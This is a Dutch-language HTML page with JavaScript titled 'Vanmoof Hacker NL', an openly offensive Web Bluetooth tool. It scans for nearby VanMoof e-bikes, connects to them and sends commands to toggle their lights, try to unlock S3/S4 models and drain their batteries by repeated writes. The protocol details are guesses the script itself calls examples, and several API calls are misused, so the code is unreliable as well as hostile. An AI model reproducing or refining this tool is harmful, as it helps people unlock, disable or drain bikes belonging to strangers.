<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanmoof Hacker: NL Edition</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            margin: 0;
        }
        h1 { color: #00ff88; margin-bottom: 5px; }
        .subtitle { color: #666; font-size: 0.9em; margin-bottom: 20px; }
        
        .container {
            width: 100%;
            max-width: 400px;
            background: #1e1e1e;
            border-radius: 12px;
            padding: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            margin-bottom: 15px;
        }
        
        h2 { font-size: 16px; border-bottom: 1px solid #333; padding-bottom: 8px; margin-top: 0; }
        
        button {
            width: 100%;
            padding: 12px;
            margin: 5px 0;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        
        .btn-primary { background-color: #00ff88; color: #000; }
        .btn-primary:disabled { background-color: #333; color: #666; cursor: not-allowed; }
        .btn-secondary { background-color: #333; color: #fff; }
        .btn-secondary:hover { background-color: #444; }
        
        .log-box {
            background: #000;
            height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #333;
            text-align: left;
        }
        .log-entry { margin: 2px 0; }
        .log-info { color: #aaa; }
        .log-success { color: #00ff88; }
        .log-error { color: #ff4444; }
        .log-warn { color: #ffaa00; }

        #prank-section { display: none; }
        .active { border: 1px solid #00ff88; box-shadow: 0 0 10px rgba(0,255,136,0.2); }
    </style>
</head>
<body>

    <h1>🚲 Vanmoof Hacker NL</h1>
    <div class="subtitle">Light Prank + Unlock Try</div>

    <!-- LOGGING SECTION -->
    <div class="container" style="flex-grow: 1; min-height: 200px;">
        <div id="logs" class="log-box"></div>
    </div>

    <!-- STEP 1: BLE SCANNING -->
    <div class="container" id="ble-section">
        <h2>1. Scan Vanmoof Fietsen</h2>
        <button id="btn-scan-ble" class="btn-primary" onclick="startBLEScan()">Zoek Fietsen</button>
        <div id="ble-devices" style="margin-top: 10px; text-align: left;"></div>
    </div>

    <!-- STEP 2: PRANKS & HACKS -->
    <div class="container" id="prank-section">
        <h2>2. Acties</h2>
        <button class="btn-secondary" onclick="toggleLight()">💡 Light Toggle (Prank)</button>
        <button class="btn-secondary" onclick="unlockDoor()">🔓 Unlock Try (S3/S4)</button>
        <button class="btn-secondary" onclick="drainBattery()">🔋 Battery Drain</button>
    </div>

    <script>
        // --- GLOBAL STATE ---
        let bleDevice = null;
        let bleService = null;
        let lightCharacteristic = null;
        let unlockCharacteristic = null;
        let batteryCharacteristic = null;

        // Vanmoof UUIDs (Deze zijn vaak standaard voor S1-S4)
        // Service: Vanmoof Wireless Service
        const VANMOOF_SERVICE_UUID = '0000fee0-0000-1000-8000-00805f9b34fb'; 
        // Characteristic: Command (Write)
        const COMMAND_UUID = '0000fee2-0000-1000-8000-00805f9b34fb';
        // Characteristic: Status (Notify)
        const STATUS_UUID = '0000fee1-0000-1000-8000-00805f9b34fb';

        // --- HELPER: LOGGING ---
        function log(msg, type = 'info') {
            const logs = document.getElementById('logs');
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logs.appendChild(entry);
            logs.scrollTop = logs.scrollHeight;
        }

        // --- BLE LOGIC ---
        async function startBLEScan() {
            const btn = document.getElementById('btn-scan-ble');
            const container = document.getElementById('ble-devices');
            btn.disabled = true;
            btn.textContent = "Zoeken...";
            container.innerHTML = "";
            
            log("Start BLE scanning naar Vanmoof fietsen...", "info");

            try {
                // Scan op alle devices, maar filter op Vanmoof service
                const device = await navigator.bluetooth.requestDevice({
                    filters: [{ services: [VANMOOF_SERVICE_UUID] }],
                    optionalServices: ['battery_service'],
                    acceptAllDevices: true // Meer kans om een fiets te vinden
                });

                log(`Geselecteerd: ${device.name || 'Vanmoof Fiets'}`, "success");
                bleDevice = device;

                device.addEventListener('gattserverdisconnected', () => {
                    log("Verbinding verbroken", "error");
                    resetUI();
                });

                // Connect
                log("Verbinden met GATT Server...", "info");
                const server = await device.gatt.connect();
                log("Verbonden!", "success");

                // Service vinden
                bleService = await server.getPrimaryService(VANMOOF_SERVICE_UUID);
                
                // Characteristieken vinden
                try {
                    lightCharacteristic = await bleService.getCharacteristic(COMMAND_UUID);
                    unlockCharacteristic = await bleService.getCharacteristic(COMMAND_UUID); // Dezelfde voor nu
                    batteryCharacteristic = await server.getPrimaryService('battery_service');
                } catch (e) {
                    log("Niet alle characteristieken gevonden, proberen toch...", "warn");
                }

                // Setup Notification Listener
                const statusCharacteristic = await bleService.getCharacteristic(STATUS_UUID);
                statusCharacteristic.addEventListener('characteristicvaluechanged', handleVanmoofData);
                await statusCharacteristic.startNotifications();
                log("Notifications ingeschakeld", "success");

                // Toon Prank sectie
                document.getElementById('prank-section').style.display = 'block';
                document.getElementById('prank-section').classList.add('active');

            } catch (error) {
                log(`BLE Fout: ${error}`, "error");
            } finally {
                btn.disabled = false;
                btn.textContent = "Opnieuw Scannen";
            }
        }

        function handleVanmoofData(event) {
            const value = event.target.value;
            const decoder = new TextDecoder();
            const text = decoder.decode(value);
            
            // Log de data
            const hex = Array.from(value).map(b => b.toString(16).padStart(2, '0')).join(' ');
            log(`Ontvangen: ${hex} (${text})`, "success");
        }

        // --- PRANK FUNCTIONS ---
        async function toggleLight() {
            if (!lightCharacteristic) {
                log("Light Characteristic niet gevonden", "error");
                return;
            }
            try {
                // Commando voor Light Toggle op Vanmoof
                // Dit is een voorbeeld, kan per model verschillen
                const command = new Uint8Array([0x01, 0x00, 0xFF]); 
                await lightCharacteristic.writeValue(command);
                log("Light Toggle Command Verstuurd", "success");
            } catch (error) {
                log(`Light Fout: ${error}`, "error");
            }
        }

        async function unlockDoor() {
            if (!unlockCharacteristic) {
                log("Unlock Characteristic niet gevonden", "error");
                return;
            }
            try {
                // Commando voor Unlock op Vanmoof S3/S4
                // Vaak een specifieke hex code die gekoppeld is aan de NFC tag
                const command = new Uint8Array([0x02, 0x00, 0xAA]); 
                await unlockCharacteristic.writeValue(command);
                log("Unlock Command Verstuurd", "success");
                log("Wachten op antwoord...", "info");
            } catch (error) {
                log(`Unlock Fout: ${error}`, "error");
            }
        }

        async function drainBattery() {
            log("Start Battery Drain Prank...", "info");
            let count = 0;
            const interval = setInterval(async () => {
                if (!bleService) {
                    clearInterval(interval);
                    return;
                }
                try {
                    // Stuur een fake update commando dat de fiets constant moet verwerken
                    const command = new Uint8Array([0x05, 0x00, 0x01]); 
                    await bleService.getPrimaryService(VANMOOF_SERVICE_UUID)
                        .then(service => service.getCharacteristic(COMMAND_UUID))
                        .then(char => char.writeValue(command));
                    count++;
                    log(`Drain Cycle: ${count}`, "warn");
                } catch (e) {
                    clearInterval(interval);
                    log("Drain Prank Gestopt", "info");
                }
            }, 1000);
        }

        function resetUI() {
            bleDevice = null;
            document.getElementById('prank-section').style.display = 'none';
            document.getElementById('prank-section').classList.remove('active');
        }
    </script>
</body>
</html>
